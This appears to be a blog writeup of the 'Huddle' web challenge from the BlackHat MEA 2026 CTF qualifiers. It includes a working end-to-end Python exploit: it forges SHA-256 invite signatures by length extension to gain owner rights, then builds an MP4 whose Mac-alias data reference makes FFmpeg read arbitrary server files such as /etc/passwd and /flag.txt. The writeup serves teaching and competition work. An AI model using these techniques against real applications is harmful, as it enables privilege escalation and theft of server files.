@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Huddle · BlackHat MEA 2026 writeup</title>
+<meta name="description" content="Huddle signs invite tokens with sha256(secret ‖ &quot;team=main&amp;email=…&amp;role=member&quot;) and parses them with a hand-rolled last-duplicate-key-wins.">
+<link rel="canonical" href="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/huddle/">
+<link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
+<link rel="icon" href="/assets/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta name="theme-color" content="#131110">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Usama Arshad">
+<meta property="og:title" content="Huddle · BlackHat MEA 2026 writeup">
+<meta property="og:description" content="Huddle signs invite tokens with sha256(secret ‖ &quot;team=main&amp;email=…&amp;role=member&quot;) and parses them with a hand-rolled last-duplicate-key-wins.">
+<meta property="og:url" content="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/huddle/">
+<meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@usama0x01">
+<meta name="twitter:title" content="Huddle · BlackHat MEA 2026 writeup">
+<meta name="twitter:description" content="Huddle signs invite tokens with sha256(secret ‖ &quot;team=main&amp;email=…&amp;role=member&quot;) and parses them with a hand-rolled last-duplicate-key-wins.">
+<meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Huddle: BlackHat MEA 2026 CTF writeup",
+  "description": "Huddle signs invite tokens with sha256(secret \u2016 \"team=main&email=\u2026&role=member\") and parses them with a hand-rolled last-duplicate-key-wins.",
+  "datePublished": "2026-11-04",
+  "author": {
+    "@type": "Person",
+    "name": "Usama Arshad",
+    "url": "https://www.usamaarshad.me/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/huddle/"
+  },
+  "articleSection": "Web",
+  "proficiencyLevel": "Expert",
+  "isPartOf": {
+    "@type": "Article",
+    "name": "BlackHat MEA 2026 CTF qualifiers",
+    "url": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/"
+  }
+}
+</script>
+<link rel="preload" href="/assets/fonts/fraunces-normal-340-640.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/jetbrainsmono-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<script>document.documentElement.classList.add("js");</script>
+<link rel="stylesheet" href="/assets/css/writeup.css">
+</head>
+<body>
+<div class="progress" id="prog" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-head" id="top">
+  <div class="container head-inner">
+    <a class="wordmark" href="/" aria-label="Usama Arshad, home">Usama Arshad<span class="dot">.</span></a>
+    <nav aria-label="Breadcrumb">
+      <a class="back-link" href="/blog/blackhat-mea-2026-quals/"><span class="arr" aria-hidden="true">←</span><span class="txt">All 15 challenges</span></a>
+    </nav>
+    <a class="btn btn-ghost head-cta" href="/assets/Usama-Arshad-Resume.pdf" download>Résumé</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="pt">
+    <div class="container">
+      <div class="masthead" data-reveal>
+        <p class="masthead-meta">
+          <span>Challenge 15 of 15</span>
+          <span>Web</span>
+          <span class="live">Solved · 100 pts</span>
+        </p>
+      </div>
+      <div class="hero-deck">
+        <div class="deck-copy" data-reveal style="--d:.08s">
+          <p class="kicker">BlackHat MEA 2026 · Qualifiers</p>
+          <h1 class="hero-title" id="pt">Huddle<span class="dot">.</span></h1>
+          <p class="deck">Huddle is a small team chat workspace. Members post in channels, invite teammates with a shareable link, and the workspace owner can switch on extra features such as video messages. You arrive as an ordinary member. Work your way into the owner's seat, then turn the workspace's own tooling into a window onto the server.</p>
+          <p class="wu-meta">
+            <span class="cat cat-web">Web</span><span class="sep">·</span>
+            <span>100 points</span><span class="sep">·</span>
+            <span>4 November 2026</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="wu-layout">
+        <article class="wu" data-reveal>
+          <div class="tldr"><p class="lab">TL;DR</p><p>Huddle signs invite tokens with sha256(secret ‖ "team=main&amp;email=…&amp;role=member") and parses them with a hand-rolled last-duplicate-key-wins splitter, so a SHA-256 length-extension appending &amp;role=owner promotes any member to workspace owner. Owner unlocks the video- message thumbnailer, which shells out to ffmpeg -enable_drefs 1 -use_absolute_path 1; a hand- built MP4 with a Mac-alias (alis) external data reference plus a custom 256-entry pal8 colour table turns each thumbnail into one JPEG-lossless bit-plane of an arbitrary server file, and 8 requests reconstruct <code>/flag.txt</code> byte-exact.</p></div>
+          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{91c5fde3a1ef9948fac9a90a2a4545a3}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{8c455742ac0f75ec8f5d645761b7a3d5}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>Target: http://k9bade1ac79139f00d48a9813d1318e9e.playat.flagyard.com (later re-run against a second instance k85c055eb8836a37c0d581c3dc51ab1c2…). Express + React SPA; nginx front, static catch-all returns index.html (200, 18191 bytes) for every unknown path, so path/file enumeration is dead (/server.js, / <code>package.json</code>, /.git/HEAD, <code>/flag.txt</code> all return the SPA). API 404s are JSON: {"error":"not found"}.</p>
+<p>Endpoints extracted from /bundle.js:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>"/api/channels/" "/api/files/thumbnail"   "/api/files/upload"
+"/api/invite"     "/api/join"             "/api/login"
+"/api/me"         "/api/register"         "/api/workspace"
+"/api/workspace/settings"</code></pre></figure>
+<p>Baseline as a fresh registered user (POST /api/register {email,password}, session cookie sid=&lt;48 hex&gt;, HttpOnly):</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>GET /api/me        -&gt; {"email":"pwn1@x.com","role":"member","workspace":"Huddle HQ"}
+GET /api/workspace -&gt; {"name":"Huddle HQ","settings":{"video_messages":false},
+                       "your_role":"member","channels":[general, random, engineering]}
+GET /api/invite    -&gt; {"token":"dGVhbT1tYWluJmVtYWlsPXB3bjFAeC5jb20mcm9sZT1tZW1iZXI",
+                       "sig":"35d201c7dbfc5187541c4150781dfa43b7aa02a056f899797ac000bc2f385eec"}</code></pre></figure>
+<p>token is base64url of team=main&amp;email=&lt;your email&gt;&amp;role=member; the client builds the share link as /join? token=&lt;token&gt;&amp;sig=&lt;sig&gt;. sig is 64 hex chars = SHA-256. The bundle also shows /api/workspace/settings is gated client-side on your_role === "owner" and toggles a single video_messages boolean, and that the message composer attaches video/*.mov files and then requests a thumbnail.</p>
+<p>The parsed oracle. POST /api/join {token, sig} with a wrong signature still echoes the server-side parse:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>{"error":"invalid invite signature","parsed":{"team":"main","email":"pwn3@x.com","role":"owner"}}</code></pre></figure>
+<p>Feeding crafted query strings through this oracle characterised the parser exactly:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>TOKEN PAYLOAD                          PARSED
+
+…&amp;role=owner&amp;role=member               role: "member" — last duplicate wins
+
+…&amp;role=member&amp;role=owner               role: "owner"
+
+…&amp;role[]=owner                         key kept literally as role[] (no PHP-style array coercion)
+
+…&amp;role=owner%00x                       role: "owner%00x" — no URL-decoding
+
+…&amp;ROLE=owner                           key ROLE — case-sensitive</code></pre></figure>
+<p>So it is a raw split('&amp;') / split('=') loop, last write wins, no percent-decoding. sig: null / sig: 0 → {"error":"token and sig required"}; true / [] / {} → invalid signature (no type-confusion bypass).</p>
+<p>Thumbnailer fingerprint. After becoming owner and enabling video_messages: POST /api/files/upload takes a raw application/octet-stream body and returns {"ok":true,"file_id":"F0000000N","size":N}; POST /api/files/thumbnail {"file_id":…} returns {"ok":true,"thumb_url":"/thumbnails/&lt;16 hex&gt;.jpg"} or {"error":"could not generate a thumbnail for this clip"}.</p>
+<ul class="bullets"><li>file_id is strictly validated:../..<code>/etc/passwd</code>, <code>/etc/passwd</code>, F00000002; id../vid all → {"error":"no such file"}. No traversal, no command injection.</li><li>Format gate: PNG, JPG, GIF, AVI, WebM, SVG, HLS.m3u8, ffconcat and neex's <code>gen_xbin_avi.py</code> AVI+M3U+XBIN payload are all rejected..mov and.mp4 work. Zeroing the major brand (d[:8] + b'XXXX' + d[12:]) still works; stripping the ftyp box fails → the check is literally bytes 4–8 == ftyp.</li><li>Output JPEG carries Comment: Lavc59.37.100 → FFmpeg 5.1, baseline, 3 components, YCbCr 4:2:0, and the JPEG's dimensions equal the source video's dimensions (64x16 in → 64x16 out), i.e. no rescaling.</li></ul>
+<p>The exact server command was later read out of <code>/proc/self/cmdline</code> through the LFI itself:</p>
+<p>ffmpeg -y -loglevel error -enable_drefs 1 -use_absolute_path 1 \ -i <code>/tmp/huddle/uploads/F00000003</code> -frames:v 1 -q:v 2 <code>/tmp/huddle/thumbs/</code>&lt;random&gt;.jpg</p>
+<p><code>/proc/self/environ</code>: HOME=<code>/tmp</code>, PATH=…, PWD=<code>/app.</code></p></section><section id="the-bug"><h2><span class="hn">02</span>The bug</h2><p>Bug 1, invite token signed with a raw SHA-256 prefix MAC over an attacker-extendable message. GET /api/invite returns token = b64url("team=main&amp;email=" + user.email + "&amp;role=member") and sig = sha256(SECRET ‖ token_plaintext), a length-extension-vulnerable construction, not HMAC. POST /api/join verifies sig over the decoded plaintext and then applies the token's role to the token's email (an unknown email gives {"error":"no such member email"}), so a member can rewrite their own role if they can forge a signature.</p>
+<p>The parser makes it exploitable in exactly one direction: it is a hand-rolled split('&amp;') / split('=') where the last duplicate key wins. The server-controlled role=member is the last field of the legitimate message, so injecting &amp;role=owner through the email field lands before it and is overwritten:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>register email = "pwn3@x.com&amp;role=owner"
+token         = team=main&amp;email=pwn3@x.com&amp;role=owner&amp;role=member
+parsed        = {"team":"main","email":"pwn3@x.com","role":"member"}      # loses</code></pre></figure>
+<p>Length extension appends after everything, including the glue padding, so the injected role=owner becomes the final occurrence and wins:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>team=main&amp;email=pwn3@x.com&amp;role=member ‖ md-padding ‖ &amp;role=owner     →   role = owner</code></pre></figure>
+<p>The secret length is the only unknown, and it is directly brute-forceable because the "invalid invite signature" error is a clean oracle (20 bytes on instance 1, 17 on instance 2, randomised per deployment).</p>
+<p>Bug 2, owner-gated thumbnailer runs FFmpeg with -enable_drefs 1 -use_absolute_path 1. Those two demuxer options re-enable QuickTime external data references: the moov/trak/mdia/minf/dinf/dref box may point sample data at a file outside the container. In libavformat/mov.c (n5.1.3), <code>mov_read_dref()</code> only honours MKTAG('a','l','i','s') records with size &gt; 150; a url entry falls into the else branch that decrements entries / i and drops it silently, so the "obvious" url -dref exploit does nothing. Inside an alis record, a variable-length record of type == 2 sets dref-&gt;path (absolute path), and <code>mov_open_dref()</code> takes the absolute-path branch when nlvl_to == 0 || nlvl_from == 0:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">c</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>} else if (c-&gt;use_absolute_path) {
+    av_log(c-&gt;fc, AV_LOG_WARNING, "Using absolute path on user request, ...");
+    if (!c-&gt;fc-&gt;io_open(c-&gt;fc, pb, ref-&gt;path, AVIO_FLAG_READ, NULL))
+        return 0;</code></pre></figure>
+<p>with <code>test_same_origin()</code> /.. /: filtering bypassed entirely (those only guard the relative branch when use_absolute_path is 0). With the sample description set to codec raw and stsz / stco under attacker control, the decoded frame is the raw bytes of any server file, at any offset.</p>
+<p>Bug 3 (exfil channel), lossy JPEG output defeated with a custom palette. The thumbnail is JPEG, so mapping one file byte to one gray8 pixel destroys the data (measured: max error 10, mean 1.89, only 25.6% of bytes exact). The QuickTime raw sample description with depth = 8 decodes as pal8 and, when the colour-table id field is 0 instead of -1, an inline 256-entry colour table follows in the sample description. Setting entry i to pure black or pure white according to bit k of i makes every pixel a JPEG-survivable extreme, so one request yields one exact bit-plane and 8 requests yield the file byte-for- byte.</p></section><section id="exploitation"><h2><span class="hn">03</span>Exploitation</h2><ol class="steps"><li>Register and pull a signed invite</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /api/register {"email":"pwn3@x.com","password":"Passw0rd123"}   -&gt; role: member
+GET /api/invite
+  token = dGVhbT1tYWluJmVtYWlsPXB3bjNAeC5jb20mcm9sZT1tZW1iZXI
+        = "team=main&amp;email=pwn3@x.com&amp;role=member"
+  sig   = 24565308adfe8a532d6b724cb0eb7b7e296b97e96b4c782339f5f4de2afb0d04</code></pre></figure>
+<ol class="steps" start="2"><li>Confirm the parser is last-wins (via the parsed oracle)</li></ol>
+<p>POST /api/join with any bogus sig echoes parsed. …&amp;role=owner&amp;role=member → member; … &amp;role=member&amp;role=owner → owner. Appending after the message is therefore the winning position. (Registering with email = "pwn3@x.com&amp;role=owner" and joining yields {"ok":true,"email":"pwn3@x.com","role":"member"}, injection alone is useless.)</p>
+<ol class="steps" start="3"><li>SHA-256 length extension → owner</li></ol>
+<p>No hash_extender / hashpumpy on the box, so SHA-256 was reimplemented in pure Python (<code>sha256ext.py</code>: <code>compress()</code>, padding(msglen) = b"\x80" + b"\x00"*((55-msglen)%64) + pack("&gt;Q", msglen*8), extend(orig_hex, orig_len, append) seeding the state from the 8 words of orig_hex). Self-test against hashlib passed.</p>
+<p>Brute-force the secret length 0–79, forging sig' = sha256_extend(sig, klen+len(qs), b"&amp;role=owner") and token' = b64url(qs ‖ padding(klen+len(qs)) ‖ "&amp;role=owner"), and POST each to /api/join with your own session cookie:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>raw 20 {"ok":true,"email":"pwn3@x.com","role":"owner"}     # instance 1
+[+] secret length = 17 -&gt; {'ok': True, ..., 'role': 'owner'} # instance 2
+GET /api/me -&gt; {"email":"pwn3@x.com","role":"owner","workspace":"Huddle HQ"}</code></pre></figure>
+<p>(Extending the base64 string instead of the decoded query string, the b64 mode in the first script, never validates; the MAC is over the raw plaintext.)</p>
+<ol class="steps" start="4"><li>Unlock the thumbnailer</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /api/workspace/settings {"video_messages":true}
+  -&gt; {"ok":true,"settings":{"video_messages":true}}</code></pre></figure>
+<ol class="steps" start="5"><li>Build an MP4 with an alis external data reference (<code>mkdref.py</code>)</li></ol>
+<p>Minimal QuickTime file: ftyp('qt ') + moov(mvhd + trak(tkhd + mdia(mdhd + hdlr'vide' + minf(vmhd + dinf(dref) + stbl)))). The dref holds one alis entry laid out to match <code>mov_read_dref()</code>'s fixed skips:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>def alis_dref(path, nlvl_from, nlvl_to):
+    p = b'\x00\x00\x00\x00' + b'\x00'*10        # version+flags, skipped
+    p += b'\x00' + b'\x00'*27                   # volume_len = 0, volume[27]
+    p += b'\x00'*12 + b'\x00' + b'\x00'*63      # skipped, filename_len, filename[63]
+    p += b'\x00'*16 + struct.pack('&gt;HH', nlvl_from, nlvl_to) + b'\x00'*16
+    pb = path.encode()
+    if len(pb) % 2: pb += b'\x00'               # parser rounds odd len up
+    p += struct.pack('&gt;HH', 2, len(pb)) + pb    # type 2 = absolute path
+    p += struct.pack('&gt;HH', 0xffff, 0)          # type -1 terminator
+    return box(b'alis', p)</code></pre></figure>
+<p>nlvl_from = nlvl_to = 0 forces the use_absolute_path branch. stsd carries a raw sample entry with data_reference_index = 1, stsz.sample_size = fsize, stts one entry, and stco chunk offset = the read offset inside the external file, i.e. arbitrary offset control. Local verification:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>[mov,mp4,...] Using absolute path on user request, this is a possible security issue
+[mov,mp4,...] Opening '/etc/passwd' for reading
+Stream #0:0: Video: rawvideo (raw / 0x20776172), pal8, 64x64</code></pre></figure>
+<p>Depth field → pix_fmt map (measured with ffprobe): 1/2/4/8/33/34/36/40 → pal8, 16 → rgb555be, 24 → rgb24, 32 → argb. Depth 8 = one file byte per pixel.</p>
+<ol class="steps" start="6"><li>Beat JPEG with a bit-plane palette</li></ol>
+<p>Patch the builder to emit an inline colour table: set the sample entry's colour-table-id to 0 (instead of -1) and append pack('&gt;IHH', 0, 255, 255) followed by 256 entries of pack('&gt;HHHH', <code>0xffff</code>, r*257, g*257, b*257); also change the frame-size formula to (width*(depth &amp; <code>0x1f</code>)+7)//8 * height. Palette for bit k: entry i = white if (i &gt;&gt; k) &amp; 1 else black. Local check on a 4096-byte file: jpeg match 1.0 (perfect), versus 0.256 exact for the naive gray8 mapping.</p>
+<ol class="steps" start="7"><li>Read files</li></ol>
+<p>Per request: build the MP4 for path/offset/bit, POST /api/files/upload (raw body), POST /api/files/ thumbnail, GET /thumbnails/&lt;hash&gt;.jpg, threshold luma at 128 → one bit-plane. OR the 8 planes together.</p>
+<p>Multi-row frames desync on the server's FFmpeg 5.1 pal8 line stride (64x16 read of <code>/etc/passwd</code> dropped bytes at every row boundary: daemon:x:1:1:daemon:<code>/usr/sbin</code>:/u/nologin), so all reads use height 1, width N, clean up to 8192 bytes per request, zero-padded past EOF. Reads are deterministic and reproduce identically across runs.</p>
+<p>A nonexistent path returns {"error":"could not generate a thumbnail for this clip"}, giving a free file- existence oracle:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>OK /app/package.json  OK /app/server.js  OK /flag.txt  OK /etc/hostname      OK /proc/self/mounts
+NO /flag NO /app/flag.txt NO /root/flag.txt NO /app/.env</code></pre></figure>
+<ol class="steps" start="8"><li>Flag</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>$ python3 rf.py /flag.txt
+========================= /flag.txt
+b'BHFlagY{91c5fde3a1ef9948fac9a90a2a4545a3}'</code></pre></figure>
+<p>Verified at three read widths (128 / 2048 / 8192). Second instance, driven end-to-end by a single <code>pwn.py</code> &lt;url&gt; (register → length-extend → enable video → read) in ~15 s, secret length 17, and re-verified with a fresh account at a different width:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>BHFlagY{8c455742ac0f75ec8f5d645761b7a3d5}</code></pre></figure>
+<p>Key code import base64, json, io, sys, http.cookiejar, urllib.request import sha256ext, mkdref from PIL import Image import numpy as np</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>U = sys.argv[1].rstrip('/')
+EMAIL, PASS = "pwn9@x.com", "Passw0rd123"
+cj = http.cookiejar.CookieJar()
+op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
+def call(method, path, data=None, raw=False):
+    body, hdrs = None, {}
+    if raw:
+         body = data; hdrs['Content-Type'] = 'application/octet-stream'
+    elif data is not None:
+         body = json.dumps(data).encode(); hdrs['Content-Type'] = 'application/json'
+    r = urllib.request.Request(U + path, data=body, method=method, headers=hdrs)
+    try:     return op.open(r, timeout=60).read()
+    except urllib.error.HTTPError as e: return e.read()
+
+def j(*a, **k): return json.loads(call(*a, **k))
+
+# 1. register as an ordinary member
+j('POST', '/api/register', {'email': EMAIL, 'password': PASS})
+
+# 2. signed invite: token = b64url("team=main&amp;email=&lt;me&gt;&amp;role=member"), sig = sha256(SECRET||qs)
+inv = j('GET', '/api/invite')
+tok, sig = inv['token'], inv['sig']
+qs = base64.urlsafe_b64decode(tok + '=' * (-len(tok) % 4))
+
+# 3. SHA-256 length extension: append "&amp;role=owner" -- last-duplicate-key-wins parser
+ap = b'&amp;role=owner'
+for klen in range(0, 80):                      # brute-force secret length (17 / 20 observed)
+    ns = sha256ext.extend(sig, klen + len(qs), ap)
+    nt = base64.urlsafe_b64encode(qs + sha256ext.padding(klen + len(qs)) + ap).decode().rstrip('=')
+    res = j('POST', '/api/join', {'token': nt, 'sig': ns})
+    if 'invalid invite signature' not in str(res):
+        print(f'[+] secret length = {klen} -&gt;', res)   # role: owner
+        break
+
+# 4. owner-only toggle unlocks the ffmpeg thumbnailer
+j('POST', '/api/workspace/settings', {'video_messages': True})
+
+# 5. arbitrary read: MP4 alis-dref (absolute path) + pal8 bit-plane palette, 8 reqs/chunk
+def thumb(mp4):
+    up = j('POST', '/api/files/upload', mp4, raw=True)
+    if not up.get('ok'): return None, up
+    t = j('POST', '/api/files/thumbnail', {'file_id': up['file_id']})
+    if not t.get('ok'): return None, t
+    return Image.open(io.BytesIO(call('GET', t['thumb_url']))), t
+
+def read_file(path, size=8192, offset=0):
+    out = np.zeros(size, dtype=np.uint8)
+    for b in range(8):
+        pal = [((((i &gt;&gt; b) &amp; 1) * 255,) * 3) for i in range(256)]   # bit b -&gt; pure black/white
+        im, info = thumb(mkdref.build(path, 0, 0, [offset], size, 1, 8, palette=pal))
+        if im is None: return None, info
+        out |= ((np.array(im.convert('L')).flatten() &gt; 128).astype(np.uint8) &lt;&lt; b)
+    return out.tobytes(), None
+
+print(read_file('/flag.txt', 2048)[0].rstrip(b'\x00'))</code></pre></figure></section><section id="dead-ends"><h2><span class="hn">04</span>Dead ends</h2><ul class="bullets"><li>Parameter injection alone fails. Registering email = "pwn3@x.com&amp;role=owner" produces team=main&amp;email=pwn3@x.com&amp;role=owner&amp;role=member; the oracle showed last-wins, so the server's trailing role=member overrides it. role[]=owner, ROLE=owner, and role=owner%00x (no URL-decoding) were all dead ends.</li><li>Signature type confusion is a dead end. sig: null and sig: 0 → {"error":"token and sig required"}; sig: true / [] / {} → normal invalid invite signature. No undefined / NaN bypass.</li><li>Length-extending the base64 string instead of the plaintext. The first <code>attack.py</code> ran both a raw and a b64 mode; only raw (extend the decoded query string, then re-encode) ever verified.</li><li>First length-extension run returned not authenticated, the ad-hoc Netscape-cookie-jar parser built a malformed Cookie header. Fixed by hardcoding sid=7898300f8c9364e1a170ce7eec47bd5702dd8cbe9e508b94 from <code>cA.txt</code>; the final <code>pwn.py</code> uses http.cookiejar + HTTPCookieProcessor instead.</li><li>No hash-extension tooling installed (hash_extender, hashpump, hashpumpy all missing) → SHA-256 compression function and MD-padding written by hand and self-tested against hashlib.</li><li>All the classic FFmpeg LFI payloads are blocked by the ftyp magic gate. neex's <code>gen_xbin_avi.py</code> AVI+M3U+XBIN, plain HLS.m3u8 pointing at file://<code>/etc/passwd</code>, and ffconcat version 1.0 / file <code>/etc/passwd</code> were all uploaded and all returned could not generate a thumbnail for this clip in ~0.44 s (no timing difference vs <code>/dev/zero</code>, so not even a blind read). PNG/JPG/GIF/AVI/ WebM/SVG rejected too; only ftyp -prefixed MP4/MOV pass.</li><li>file_id is not injectable.../..<code>/etc/passwd</code>, <code>/etc/passwd</code>, F00000002; id → {"error":"no such file"}.</li><li>Static-file enumeration is useless, the SPA catch-all returns index.html (200, 18191 bytes) for / <code>server.js</code>, /package.json, /.git/HEAD, <code>/flag.txt</code>, /uploads/…, so 200 means nothing.</li><li>url drefs do nothing. Reading <code>mov.c</code> n5.1.3 showed the non- alis branch just logs Unknown dref type and decrements the entry count; only a Mac-alias record with size &gt; 150 reaches <code>mov_open_dref()</code>.</li><li>Naive byte-as-pixel exfil is lossy. gray8 through the server's JPEG encoder: max error 10, mean 1.89, 25.6% of bytes exact (root:x:0:0:root:… came back as ppot8z71:58onqv;0…). monow 1-bit rawvideo survives JPEG but is unreachable, depths 1/2/4/8 all decode as pal8, which is what led to the palette trick instead.</li><li>Multi-row frames desync on the server. 64x64 / 64x16 reads dropped bytes at each row boundary under the server's FFmpeg 5.1 pal8 line stride (locally on FFmpeg 8.1 the same file read cleanly, masking the bug). Switching to height 1 / width N fixed it; 8192 bytes per read verified.</li><li>Short files corrupt full-frame reads locally, a 3256-byte <code>/etc/passwd</code> in a 4096-pixel frame matched only ~50%; testing with a 16 KB <code>big.bin</code> gave 100%, isolating the issue as short-read rather than palette failure.</li><li>The secret length is per-deployment (20 on the first instance, 17 on the second), so it must be brute-forced each time; <code>pwn.py</code> sweeps 0–79 automatically.</li><li>The second host was recycled shortly after the solve (nginx 404 on every path) when asked to re-attack it fresh, the flag had already been captured and verified twice.</li></ul>
+<p class="codelabel">Appendix A, Cross-cutting notes Dynamic flags</p>
+<p>Most FlagYard instances set FLAG_VALUE="$DYN_FLAG", minting a fresh flag per deployment. Every exploit in this report is therefore written to recover the flag rather than to assert a constant, and several sections list two different flags captured from two different instances of the same challenge.</p>
+<p class="codelabel">Instance lifetime</p>
+<p>Live instances expire without closing the socket. A dead PWN instance still accepts the TCP connect and then sends nothing; a dead web instance returns connection refused after a handful of probes. When an exploit that previously worked suddenly produces silence, the first hypothesis should be an expired instance, not a broken exploit.</p>
+<p class="codelabel">Technique index</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>TECHNIQUE                                                              CHALLENGES
+
+Structured algebraic attack on an under-queried oracle                 Hokan, Popcnt Oracle
+
+Nonce/key reuse in AEAD (GHASH forbidden attack)                       Reduce, Reuse, Recycle
+
+Host-artifact recovery (quarantine, trash, journald)                   Qfact, Whisper
+
+Memory-corruption to control flow                                      baiby-pwn, Teto, Bug Where
+
+Packer / anti-analysis unwrapping                                      upyx, extended-license, free-agentic-tool
+
+Browser-as-confused-deputy (SSRF, file://, CSP bypass)                 DeckForge, Lumen, Dead Drop
+
+Authorization / access-control escalation                              Huddle</code></pre></figure>
+<p class="codelabel">Appendix B, Reproduction</p>
+<p>Solver code referenced in this report lives under the challenge directories:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>PATH                                               CONTENTS
+
+Crpto/Hokan/sol/                                   solve.py , enum.c , attack.py , fmt.py , sim.py
+
+Crpto/Hokan/solution/solve_dead_drop.py            Dead Drop solver
+
+web/Dead_Drop/                                     DeckForge solver solve.py , SOLUTION.md , evidence/
+
+web/Lumen/exploit.py                               Lumen CSP-bypass chain</code></pre></figure>
+<p class="codelabel">pwn/baiby/ <code>SOLUTION.py</code>, <code>SOLVE_ROUTE_A.py</code>, <code>EXPLOIT_PLAN.md</code>, <code>HANDOFF.md</code></p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>pwn/teto/exploit/                                  byte-exact simulator, planner, painter, leak (validated)</code></pre></figure>
+<p>rev/upyx_out/ <code>WRITEUP.md</code>, <code>solve_960.py</code>, <code>recover_flag.py</code>, decrypted modules</p></section>
